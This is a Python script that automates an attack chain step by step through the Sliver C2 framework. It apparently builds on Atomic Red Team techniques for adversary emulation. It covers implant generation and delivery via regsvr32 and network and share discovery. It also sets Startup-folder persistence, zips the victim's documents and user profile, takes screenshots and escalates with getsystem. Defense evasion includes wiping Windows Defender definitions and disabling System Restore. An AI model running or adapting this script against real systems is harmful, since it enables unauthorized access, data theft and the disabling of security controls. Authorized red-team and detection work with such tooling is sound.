
import asyncio
from rich.console import Console
from rich.prompt import Confirm
from rich.panel import Panel
from typing import Dict
console = Console()
user_params: Dict[str, str] = {}
def print_welcome_message():
    console.print(
        Panel(
            "[bold blink yellow]🎯 Welcome to Attack Execution Wizard[/]",
            title="[bold green]Hello[/]",
            subtitle="[bold blue]Let's Begin[/]",
            expand=False,
        )
    )
def print_finished_message(message="Command completed!😊", status="info"):
    console.print(f"[bold green][FINISHED][/bold green] {message}")
def confirm_action(prompt: str = "Keep going with the next attack step?") -> bool:
    styled_prompt = f"[bold bright_cyan]{prompt}[/]"
    return Confirm.ask(
        styled_prompt,
        default="y",
        choices=["y", "n"],
        show_default=False,
    )      
async def main():
    print_welcome_message()
    from attack_executor.config import load_config
    config = load_config(config_file_path="/home/kali/Desktop/xiangmu/attack_executor-main/aurora/executor/config.ini")
    from attack_executor.post_exploit.Sliver import SliverExecutor
    sliver_executor = SliverExecutor(config=config)
    console.print("""\
        [bold green][MANUAL ACTION REQUIRED][/bold green]
        sliver > generate --mtls #{LHOST}:#{LPORT} --os windows --arch 64bit --format shared --save #{SAVE_PATH}
        sliver > mtls --lport #{LPORT}
        """)
    confirm_action()
    console.print("""\
        [bold green][MANUAL ACTION REQUIRED][/bold green]
        (This step needs human interaction and (temporarily) cannot be executed automatically)
        (On attacker's machine)
        python -m http.server

        (On victim's machine)
        1. Open #{LHOST}:#{LPORT} in the browser
        2. Navigate to the path of the file on the attacker's machine
        3. Download the file to #{PATH}
        """)
    confirm_action()
    console.print("""\
        [bold green][MANUAL ACTION REQUIRED][/bold green]
        (This step needs human interaction and (temporarily) cannot be executed automatically)
        (On victim's machine, use PowerShell or Command Prompt)
        regsvr32 #{DLL_PATH}
        """)
    confirm_action()


    # Sliver-session selection
    console.print("[bold cyan]\n[Sliver Executor] Session Selection[/]")
    sliver_sessionid = await sliver_executor.select_sessions()

    user_params["SessionID"] = sliver_sessionid

    confirm_action()
    commands = rf"""
    get-smbshare

    """
    await sliver_executor.powershell(session_id=sliver_sessionid,input_commands=commands)

    print_finished_message()

    confirm_action()
    commands = f"""
    arp -a
    """
    await sliver_executor.cmd(session_id=sliver_sessionid,input_commands=commands)

    print_finished_message()

    user_params["SessionID"] = sliver_sessionid

    # Sliver command execution
    console.print(f"[bold cyan]\n[Sliver Executor] Executing: ls[/]")
    confirm_action()
    try:
        await sliver_executor.ls(user_params["SessionID"])
    except Exception as e:
        console.print(f"[bold red]✗ Command failed: {str(e)}[/]")
        raise

    user_params["SessionID"] = sliver_sessionid

    # Sliver command execution
    console.print(f"[bold cyan]\n[Sliver Executor] Executing: whoami[/]")
    confirm_action()
    try:
        await sliver_executor.whoami(user_params["SessionID"])
    except Exception as e:
        console.print(f"[bold red]✗ Command failed: {str(e)}[/]")
        raise
    console.print("""\
        [bold green][MANUAL ACTION REQUIRED][/bold green]
        sliver > generate --mtls #{LHOST}:#{LPORT} --os windows --arch 64bit --format service --save #{SAVE_PATH}
        sliver > mtls --lport #{LPORT}
        """)
    confirm_action()
    console.print("""\
        [bold green][MANUAL ACTION REQUIRED][/bold green]
        (This step needs human interaction and (temporarily) cannot be executed automatically)
        (On attacker's machine)
        python -m http.server

        (On victim's machine)
        1. Open #{LHOST}:#{LPORT} in the browser
        2. Navigate to the path of the file on the attacker's machine
        3. Download the file to #{PATH}
        """)
    confirm_action()

    confirm_action()

    console.print(f"[bold cyan]\n📌[PowerShell Executor] Step 13 Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: new_startup_folder[/]")
    console.print(f"  Description: new startup folder to replace standard one")
    default_val = "$env:TMP\atomictest"
    user_input = console.input(
        f"[bold]➤ Enter value for new_startup_folder [default: {default_val}]: [/]"
    ) or default_val
    if not user_input and False:
        raise ValueError("Missing required parameter: new_startup_folder")
    user_params["new_startup_folder"] = user_input

    console.print(f"[bold cyan]\n📌[PowerShell Executor] Step 13 Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: payload[/]")
    console.print(f"  Description: executable to be placed in new startup location ")
    default_val = "C:\Windows\System32\calc.exe"
    user_input = console.input(
        f"[bold]➤ Enter value for payload [default: {default_val}]: [/]"
    ) or default_val
    if not user_input and False:
        raise ValueError("Missing required parameter: payload")
    user_params["payload"] = user_input
    commands = rf"""
    New-Item -ItemType Directory -path "{user_params["new_startup_folder"]}"
    Copy-Item -path "{user_params["payload"]}" -destination "{user_params["new_startup_folder"]}"
    Set-ItemProperty -Path  "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" -Name "Startup" -Value "{user_params["new_startup_folder"]}"

    """
    await sliver_executor.powershell(session_id=sliver_sessionid,input_commands=commands)

    print_finished_message()


    confirm_action()

    console.print(f"[bold cyan]\n📌[PowerShell Executor] Step 15 Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: output_zip_folder_path[/]")
    console.print(f"  Description: Path to directory for saving the generated zip file")
    default_val = "PathToAtomicsFolder\..\ExternalPayloads\T1005"
    user_input = console.input(
        f"[bold]➤ Enter value for output_zip_folder_path [default: {default_val}]: [/]"
    ) or default_val
    if not user_input and False:
        raise ValueError("Missing required parameter: output_zip_folder_path")
    user_params["output_zip_folder_path"] = user_input
    commands = """
    $startingDirectory="C:"; $outputZip="#{output_zip_folder_path}"; $fileExtensions=@(".doc",".docx",".txt"); New-Item -Type Directory $outputZip -Force -ErrorAction Ignore | Out-Null; Get-ChildItem -Path $startingDirectory -Recurse -File | Where-Object {$_.Extension -in $fileExtensions} | ForEach-Object -Begin {$files=@()} -Process {$files += $_.FullName} -End {if ($files) { Compress-Archive -Path $files -DestinationPath "$outputZip\data.zip"; Write-Host "Zip file created: $outputZip\data.zip" } else { Write-Host "No files found" }}

    """
    await sliver_executor.powershell(session_id=sliver_sessionid,input_commands=commands)

    print_finished_message()

    user_params["SessionID"] = sliver_sessionid

    # Sliver command execution
    console.print(f"[bold cyan]\n[Sliver Executor] Executing: screenshot[/]")
    confirm_action()
    try:
        await sliver_executor.screenshot(user_params["SessionID"])
    except Exception as e:
        console.print(f"[bold red]✗ Command failed: {str(e)}[/]")
        raise

    console.print(f"[bold cyan]\n📌[Sliver Executor] Step 17 Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: remote_path[/]")
    console.print(f"  Description: Full path of the directory to create")
    default_val = ""
    user_input = console.input(
        f"[bold]➤ Enter value for remote_path [default: {default_val}]: [/]"
    ) or default_val
    if not user_input and False:
        raise ValueError("Missing required parameter: remote_path")
    user_params["remote_path"] = user_input

    user_params["SessionID"] = sliver_sessionid

    # Sliver command execution
    console.print(f"[bold cyan]\n[Sliver Executor] Executing: mkdir[/]")
    confirm_action()
    try:
        await sliver_executor.mkdir(user_params["remote_path"], user_params["SessionID"])
    except Exception as e:
        console.print(f"[bold red]✗ Command failed: {str(e)}[/]")
        raise

    confirm_action()

    console.print(f"[bold cyan]\n📌[PowerShell Executor] Step 18 Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: input_file[/]")
    console.print(f"  Description: Path that should be compressed into our output file")
    default_val = "$env:USERPROFILE"
    user_input = console.input(
        f"[bold]➤ Enter value for input_file [default: {default_val}]: [/]"
    ) or default_val
    if not user_input and False:
        raise ValueError("Missing required parameter: input_file")
    user_params["input_file"] = user_input

    console.print(f"[bold cyan]\n📌[PowerShell Executor] Step 18 Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: output_file[/]")
    console.print(f"  Description: Path where resulting compressed data should be placed")
    default_val = "$env:USERPROFILE\T1560-data-ps.zip"
    user_input = console.input(
        f"[bold]➤ Enter value for output_file [default: {default_val}]: [/]"
    ) or default_val
    if not user_input and False:
        raise ValueError("Missing required parameter: output_file")
    user_params["output_file"] = user_input
    commands = rf"""
    dir {user_params["input_file"]} -Recurse | Compress-Archive -DestinationPath {user_params["output_file"]}

    """
    await sliver_executor.powershell(session_id=sliver_sessionid,input_commands=commands)

    print_finished_message()

    console.print("[bold green][MANUAL ACTION REQUIRED][/bold green]")
    console.print("In the Sliver C2 console, execute the [bold green]getsystem[/bold green] command on a session with local administrator privileges to obtain a session under the NT AUTHORITY\SYSTEM account. Once elevated system privileges are acquired, you can select this high-privilege session to perform subsequent operations.")
    confirm_action()
    sliver_sessionid = await sliver_executor.select_sessions()

    confirm_action()
    commands = """
    reg add \"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\" /v HideSCANetwork /t REG_DWORD /d 1 /f

    """
    await sliver_executor.cmd(session_id=sliver_sessionid,input_commands=commands)

    print_finished_message()

    confirm_action()
    commands = """
    reg add \"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\" /v DisableLockWorkstation /t REG_DWORD /d 1 /f

    """
    await sliver_executor.cmd(session_id=sliver_sessionid,input_commands=commands)

    print_finished_message()

    user_params["SessionID"] = sliver_sessionid


    confirm_action()
    commands = """
    \"C:\Program Files\Windows Defender\MpCmdRun.exe\" -RemoveDefinitions -All

    """
    await sliver_executor.cmd(session_id=sliver_sessionid,input_commands=commands)

    print_finished_message()

    confirm_action()
    commands = f"""
    reg add "HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows NT\Terminal Services" /v "DisableSecuritySettings" /t REG_DWORD /d 1 /f
    """
    await sliver_executor.cmd(session_id=sliver_sessionid,input_commands=commands)

    print_finished_message()

    confirm_action()
    commands = """
    schtasks.exe /Change /TN \"\Microsoft\Windows\SystemRestore\SR\" /disable

    """
    await sliver_executor.cmd(session_id=sliver_sessionid,input_commands=commands)

    print_finished_message()

if __name__ == "__main__":
    asyncio.run(main())
